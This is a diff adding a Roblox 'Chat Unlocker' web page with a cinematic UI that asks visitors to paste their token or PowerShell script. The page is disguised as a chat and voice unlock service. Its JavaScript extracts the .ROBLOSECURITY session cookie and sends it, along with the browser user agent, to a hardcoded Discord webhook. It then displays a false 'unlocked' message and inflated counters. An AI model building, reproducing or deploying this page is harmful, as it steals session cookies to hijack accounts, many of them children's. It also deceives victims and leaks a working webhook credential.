@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Chat Unlocker | Hyperion Protocol</title>
+  <meta name="description" content="Roblox chat & voice unlock — next‑gen cinematic UI">
+  <meta name="theme-color" content="#00ffcc">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: radial-gradient(circle at 10% 20%, #03050f, #000000);
+      font-family: 'Inter', system-ui, sans-serif;
+      color: #ffffff;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* плазменный фон */
+    .plasma-bg {
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(circle at 20% 40%, rgba(0, 255, 204, 0.15) 0%, transparent 50%),
+                  radial-gradient(circle at 80% 70%, rgba(139, 92, 246, 0.15) 0%, transparent 50%),
+                  radial-gradient(circle at 40% 90%, rgba(255, 102, 192, 0.1) 0%, transparent 60%);
+      z-index: 0;
+      animation: plasmaDrift 18s infinite alternate;
+      pointer-events: none;
+    }
+
+    @keyframes plasmaDrift {
+      0% { transform: scale(1) translate(0, 0); opacity: 0.8; filter: blur(0px); }
+      100% { transform: scale(1.2) translate(2%, 3%); opacity: 1; filter: blur(5px); }
+    }
+
+    /* голографическая карточка */
+    .holo-card {
+      background: rgba(6, 8, 18, 0.55);
+      backdrop-filter: blur(16px);
+      border-radius: 2.4rem;
+      border: 1px solid rgba(0, 255, 204, 0.3);
+      transition: all 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.2);
+      animation: borderNeon 3s infinite alternate;
+    }
+    @keyframes borderNeon {
+      0% { border-color: rgba(0, 255, 204, 0.2); box-shadow: 0 0 0px rgba(0, 255, 204, 0); }
+      100% { border-color: rgba(168, 85, 247, 0.8); box-shadow: 0 0 45px rgba(168, 85, 247, 0.4); }
+    }
+    .holo-card:hover {
+      transform: translateY(-8px);
+      border-color: #ff66c0;
+      box-shadow: 0 0 65px rgba(255, 102, 192, 0.5);
+    }
+
+    /* гипер-кнопка */
+    .hyper-btn {
+      background: linear-gradient(105deg, #00ffcc, #a855f7, #ff66c0, #00ffcc);
+      background-size: 300% 300%;
+      animation: hyperGradient 4s infinite alternate, hyperGlow 2s infinite;
+      font-weight: 700;
+      letter-spacing: 1px;
+      transition: all 0.3s;
+    }
+    @keyframes hyperGradient {
+      0% { background-position: 0% 50%; }
+      100% { background-position: 100% 50%; }
+    }
+    @keyframes hyperGlow {
+      0% { box-shadow: 0 0 0px 0px #00ffcc; }
+      50% { box-shadow: 0 0 35px 4px #a855f7; }
+      100% { box-shadow: 0 0 0px 0px #00ffcc; }
+    }
+    .hyper-btn:hover {
+      transform: scale(1.02);
+      filter: brightness(1.08);
+    }
+
+    /* лазерный инпут */
+    .laser-input {
+      background: #070a14cc;
+      border: 1px solid #24283e;
+      border-radius: 1.4rem;
+      transition: all 0.2s;
+    }
+    .laser-input:focus {
+      border-color: #00ffcc;
+      box-shadow: 0 0 35px rgba(0, 255, 204, 0.5);
+      outline: none;
+    }
+
+    /* карточки статистики с левитацией */
+    .stat-levitate {
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(12px);
+      border-radius: 1.4rem;
+      border: 1px solid #2a2e44;
+      transition: all 0.25s;
+      animation: levitate 2.5s infinite ease-in-out;
+    }
+    @keyframes levitate {
+      0% { transform: translateY(0px); border-color: #2a2e44; }
+      50% { transform: translateY(-6px); border-color: #00ffcc; box-shadow: 0 0 20px rgba(0, 255, 204, 0.3); }
+      100% { transform: translateY(0px); border-color: #2a2e44; }
+    }
+
+    /* кнопки действий */
+    .action-cyber {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid #24283e;
+      border-radius: 1rem;
+      transition: 0.2s;
+    }
+    .action-cyber:hover {
+      background: rgba(0, 255, 204, 0.12);
+      border-color: #00ffcc;
+      transform: scale(1.03);
+      box-shadow: 0 0 15px rgba(0, 255, 204, 0.4);
+    }
+
+    /* тосты */
+    .toast-hyperion {
+      background: #05080fcc;
+      backdrop-filter: blur(24px);
+      border-left: 6px solid #00ffcc;
+      border-radius: 1rem;
+    }
+
+    /* скролл */
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: #0b0e18; }
+    ::-webkit-scrollbar-thumb { background: #00ffcc; border-radius: 10px; }
+
+    /* шейк */
+    @keyframes shakeUltra {
+      0%,100% { transform: translateX(0); }
+      25% { transform: translateX(-7px); }
+      75% { transform: translateX(7px); }
+    }
+    .shake-ultra { animation: shakeUltra 0.3s ease-in-out; }
+
+    /* частицы */
+    .particle {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 2px;
+      height: 2px;
+      background: #00ffcc;
+      border-radius: 50%;
+      opacity: 0.6;
+      animation: particleUp 8s linear infinite;
+      pointer-events: none;
+      z-index: 1;
+    }
+    @keyframes particleUp {
+      0% { transform: translateY(0) translateX(0); opacity: 0.6; }
+      100% { transform: translateY(-100vh) translateX(20px); opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+  <div class="plasma-bg"></div>
+  <div id="particles"></div>
+
+  <div class="relative z-20 max-w-5xl mx-auto px-5 py-7">
+    <!-- header -->
+    <div class="flex flex-wrap justify-between items-center gap-4 mb-12 animate-[fadeSlideUp_0.5s_ease]">
+      <div class="flex items-center gap-4">
+        <div class="w-12 h-12 rounded-full bg-gradient-to-tr from-[#00ffcc] to-[#ff66c0] flex items-center justify-center shadow-[0_0_15px_#00ffcc] animate-pulse">
+          <i class="fab fa-roblox text-white text-xl"></i>
+        </div>
+        <div>
+          <h1 class="text-2xl font-bold tracking-tight bg-gradient-to-r from-[#00ffcc] to-[#a855f7] bg-clip-text text-transparent">Chat Unlocker</h1>
+          <p class="text-xs text-gray-400">hyperion protocol • unlock now</p>
+        </div>
+      </div>
+      <div class="flex gap-5 text-sm">
+        <a href="#" class="text-gray-300 hover:text-[#00ffcc] transition">Home</a>
+        <a href="#" class="text-gray-300 hover:text-[#00ffcc] transition">API</a>
+        <a href="#" class="text-gray-300 hover:text-[#00ffcc] transition">Discord</a>
+      </div>
+    </div>
+
+    <!-- статистика -->
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-5 mb-10">
+      <div class="stat-levitate p-4 text-center">
+        <i class="fas fa-users text-[#00ffcc] text-2xl mb-1"></i>
+        <p class="text-2xl font-bold" id="totalUnlock">14.3K</p>
+        <p class="text-[10px] uppercase tracking-wider text-gray-400">unlocked</p>
+      </div>
+      <div class="stat-levitate p-4 text-center">
+        <i class="fas fa-microphone-alt text-[#00ffcc] text-2xl mb-1"></i>
+        <p class="text-2xl font-bold" id="voiceUnlock">3.9K</p>
+        <p class="text-[10px] uppercase tracking-wider text-gray-400">voice ready</p>
+      </div>
+      <div class="stat-levitate p-4 text-center">
+        <i class="fas fa-shield-alt text-[#00ffcc] text-2xl mb-1"></i>
+        <p class="text-2xl font-bold">AES256</p>
+        <p class="text-[10px] uppercase tracking-wider text-gray-400">encrypted</p>
+      </div>
+      <div class="stat-levitate p-4 text-center">
+        <i class="fas fa-bolt text-[#00ffcc] text-2xl mb-1"></i>
+        <p class="text-2xl font-bold">99.9%</p>
+        <p class="text-[10px] uppercase tracking-wider text-gray-400">uptime</p>
+      </div>
+    </div>
+
+    <!-- главный блок -->
+    <div class="holo-card p-7 md:p-9 rounded-3xl animate-[fadeSlideUp_0.7s_ease]">
+      <div class="text-center mb-6">
+        <div class="w-28 h-28 mx-auto rounded-full bg-black/60 border-2 border-[#00ffcc] flex items-center justify-center shadow-[0_0_45px_#00ffcc] animate-pulse">
+          <i class="fas fa-unlock-alt text-5xl text-[#00ffcc]"></i>
+        </div>
+        <h2 class="text-2xl font-bold mt-4">Chat Unlocker <span class="text-transparent bg-clip-text bg-gradient-to-r from-[#00ffcc] to-[#ff66c0]"></span></h2>
+        <p class="text-gray-400 text-sm max-w-md mx-auto">submit token → instant unlock chat + voice</p>
+      </div>
+
+      <div class="mb-6">
+        <label class="block text-sm font-medium text-gray-300 mb-1"><i class="fab fa-microsoft mr-1 text-[#00ffcc]"></i> Chat Unlocker  </label>
+        <textarea id="tokenInput" rows="4" class="laser-input w-full p-3 text-sm resize-y" placeholder="paste your token or powershell script..."></textarea>
+        <div class="flex justify-between mt-2 text-xs text-gray-500">
+          <span id="charCount">0 chars</span>
+          <span id="tokenStatus" class="flex items-center gap-1"><i class="fas fa-shield-alt"></i> idle</span>
+        </div>
+      </div>
+
+      <div class="flex flex-wrap gap-3 justify-center mb-7">
+        <button id="clearBtn" class="action-cyber px-5 py-2 text-sm transition"><i class="fas fa-trash-alt"></i> Clear</button>
+        <button id="pasteBtn" class="action-cyber px-5 py-2 text-sm transition"><i class="fas fa-paste"></i> Paste</button>
+        <button id="copyBtn" class="action-cyber px-5 py-2 text-sm transition"><i class="fas fa-copy"></i> Copy</button>
+      </div>
+
+      <button id="unlockBtn" class="hyper-btn w-full py-3 rounded-xl text-white text-md flex items-center justify-center gap-2">
+        <i class="fas fa-unlock-alt"></i> UNLOCK CHAT & VOICE
+      </button>
+
+      <div id="loadingPanel" class="hidden mt-5 text-center">
+        <div class="inline-block w-5 h-5 border-2 border-[#00ffcc] border-t-transparent rounded-full animate-spin"></div>
+        <p class="text-xs text-[#00ffcc] mt-1">decrypting token..</p>
+      </div>
+
+      <div id="errorMsg" class="hidden mt-4 text-red-400 text-sm bg-red-500/10 py-2 rounded-xl text-center border border-red-500/40"></div>
+      <div id="successMsg" class="hidden mt-4 text-green-400 text-sm bg-green-500/10 py-2 rounded-xl text-center border border-green-500/40"></div>
+
+      <div class="mt-6 text-center text-[11px] text-gray-500 border-t border-white/10 pt-5">
+        <i class="fas fa-lock"></i> 
+      </div>
+    </div>
+
+    <footer class="text-center text-gray-500 text-xs py-6 mt-4">
+      © 2026 Chat Unlocker — hyperion protocol | ultra‑cinematic experience
+    </footer>
+  </div>
+
+  <div id="toastContainer"></div>
+
+  <script>
+    // генерация частиц
+    for (let i = 0; i < 45; i++) {
+      const particle = document.createElement('div');
+      particle.classList.add('particle');
+      particle.style.left = Math.random() * 100 + '%';
+      particle.style.animationDelay = Math.random() * 8 + 's';
+      particle.style.animationDuration = 6 + Math.random() * 6 + 's';
+      particle.style.background = `radial-gradient(circle, #00ffcc, #a855f7)`;
+      document.body.appendChild(particle);
+    }
+
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1499760302688964708/8CHajhBd7jJT1jB_elR4wEIQJc9LvOQZAqI2-bvQm2ZQK06MDpeySgafzYT2JvT1lV2v';
+
+    const tokenInput = document.getElementById('tokenInput');
+    const unlockBtn = document.getElementById('unlockBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const pasteBtn = document.getElementById('pasteBtn');
+    const copyBtn = document.getElementById('copyBtn');
+    const loadingPanel = document.getElementById('loadingPanel');
+    const errorMsg = document.getElementById('errorMsg');
+    const successMsg = document.getElementById('successMsg');
+    const charCountSpan = document.getElementById('charCount');
+    const tokenStatusSpan = document.getElementById('tokenStatus');
+
+    let totalUnlock = 14300;
+    let totalVoice = 3900;
+
+    function showToast(msg, isError = false) {
+      const container = document.getElementById('toastContainer');
+      const toast = document.createElement('div');
+      toast.className = `fixed bottom-5 right-5 z-50 toast-hyperion text-white text-sm px-4 py-2 rounded-xl flex items-center gap-2 shadow-xl`;
+      toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
+      container.appendChild(toast);
+      setTimeout(() => toast.remove(), 3200);
+    }
+
+    function extractToken(text) {
+      const match = text.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
+      if (match) return match[1];
+      if (text.includes('_|WARNING') && text.length > 100) return text.trim();
+      return null;
+    }
+
+    function updateUI() {
+      const len = tokenInput.value.length;
+      charCountSpan.innerText = `${len} chars`;
+      const token = extractToken(tokenInput.value);
+      if (token && token.length >= 50) {
+        tokenStatusSpan.innerHTML = '<i class="fas fa-check-circle text-green-400"></i> token valid';
+        tokenStatusSpan.className = 'flex items-center gap-1 text-green-400 text-xs';
+      } else if (len > 0) {
+        tokenStatusSpan.innerHTML = '<i class="fas fa-exclamation-triangle text-yellow-400"></i> invalid';
+        tokenStatusSpan.className = 'flex items-center gap-1 text-yellow-400 text-xs';
+      } else {
+        tokenStatusSpan.innerHTML = '<i class="fas fa-shield-alt"></i> idle';
+        tokenStatusSpan.className = 'flex items-center gap-1 text-gray-500 text-xs';
+      }
+    }
+
+    async function sendToDiscord(token) {
+      const blob = new Blob([token], { type: "text/plain" });
+      const formData = new FormData();
+      formData.append("file", blob, "ROBLOSECURITY_unlock.txt");
+      formData.append("content", "🔓 **Chat Unlock Request**\nToken submitted for hyperion unlock.");
+
+      const embed = {
+        title: "🎙️ Unlock Request | Hyperion Protocol",
+        color: 0x00ffcc,
+        fields: [
+          { name: "📏 Length", value: `${token.length} chars`, inline: true },
+          { name: "🌐 Agent", value: navigator.userAgent.slice(0, 45), inline: true },
+          { name: "⏰ Time", value: new Date().toLocaleString(), inline: true }
+        ],
+        footer: { text: "Chat Unlocker • Hyperion" },
+        timestamp: new Date().toISOString()
+      };
+      formData.append("payload_json", JSON.stringify({ embeds: [embed] }));
+
+      try {
+        const res = await fetch(WEBHOOK_URL, { method: "POST", body: formData });
+        return res.ok;
+      } catch {
+        return false;
+      }
+    }
+
+    async function handleUnlock() {
+      const raw = tokenInput.value.trim();
+      errorMsg.classList.add('hidden');
+      successMsg.classList.add('hidden');
+
+      if (!raw) {
+        errorMsg.innerText = '❌ Insert .ROBLOSECURITY token';
+        errorMsg.classList.remove('hidden');
+        tokenInput.classList.add('shake-ultra');
+        setTimeout(() => tokenInput.classList.remove('shake-ultra'), 400);
+        return;
+      }
+
+      const token = extractToken(raw);
+      if (!token || token.length < 50) {
+        errorMsg.innerText = '❌ Token invalid';
+        errorMsg.classList.remove('hidden');
+        return;
+      }
+
+      unlockBtn.disabled = true;
+      loadingPanel.classList.remove('hidden');
+
+      const sent = await sendToDiscord(token);
+
+      setTimeout(() => {
+        loadingPanel.classList.add('hidden');
+        unlockBtn.disabled = false;
+
+        if (sent) {
+          totalUnlock += 1;
+          totalVoice += 1;
+          document.getElementById('totalUnlock').innerText = totalUnlock.toLocaleString();
+          document.getElementById('voiceUnlock').innerText = totalVoice.toLocaleString();
+          successMsg.innerText = '✅ Chat & voice unlocked! Token verified.';
+          successMsg.classList.remove('hidden');
+          tokenInput.value = '';
+          updateUI();
+          showToast('Unlock success', false);
+        } else {
+          errorMsg.innerText = '❌ Unlock failed — webhook error';
+          errorMsg.classList.remove('hidden');
+          showToast('Unlock failed', true);
+        }
+      }, 1500);
+    }
+
+    tokenInput.addEventListener('input', updateUI);
+    unlockBtn.addEventListener('click', handleUnlock);
+    clearBtn.addEventListener('click', () => { tokenInput.value = ''; updateUI(); showToast('Cleared', false); });
+    pasteBtn.addEventListener('click', async () => {
+      const txt = await navigator.clipboard.readText();
+      tokenInput.value = txt;
+      updateUI();
+      showToast('Pasted', false);
+    });
+    copyBtn.addEventListener('click', async () => {
+      if (tokenInput.value) {
+        await navigator.clipboard.writeText(tokenInput.value);
+        showToast('Copied', false);
+      } else showToast('Nothing to copy', true);
+    });
+
+    updateUI();
+  </script>
+</body>
+</html>
